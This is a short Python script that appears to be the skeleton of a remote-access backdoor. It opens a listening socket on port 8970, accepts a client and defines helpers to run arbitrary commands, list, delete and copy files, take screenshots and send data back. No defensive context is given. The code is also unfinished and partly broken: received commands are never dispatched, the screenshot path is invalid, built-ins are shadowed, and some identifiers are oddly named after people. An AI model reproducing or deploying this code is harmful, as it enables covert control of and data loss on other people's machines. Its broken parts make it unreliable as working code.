import shutil
import os
import socket
import subprocess

import pyautogui


def exec(name):
    try:
        subprocess.call(name)
    except Exception as e:
        print(e)


def send(data):
    data = str(data)
    try:
        client_socket.send(data.encode())
    except Exception as e:
        print(e)


def muhammed(dire):
    dire  = str(dire)
    gilad_shalit = os.listdir(dire)
    return gilad_shalit


def delete(file):
    file = str(file)
    try:
        os.remove(file)
    except Exception as e:
        print(e)


def copy(file1,file2):
    try:
        shutil.copy(file1,file2)
    except Exception as e:
        print(e)


def screen_shootin():
    try:
        scren = pyautogui.screenshot()
        scren.save(r"c:\\")
    except Exception as e:
        print(e)


def exit():
    server_socket.close()
    client_socket.close()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0',8970))
server_socket.listen()
print("server up")
client_socket,client_adress = server_socket.accept()
print("client connected")
data = client_socket.recv(1024).decode()
print("client sent " + data)
data = data.split()


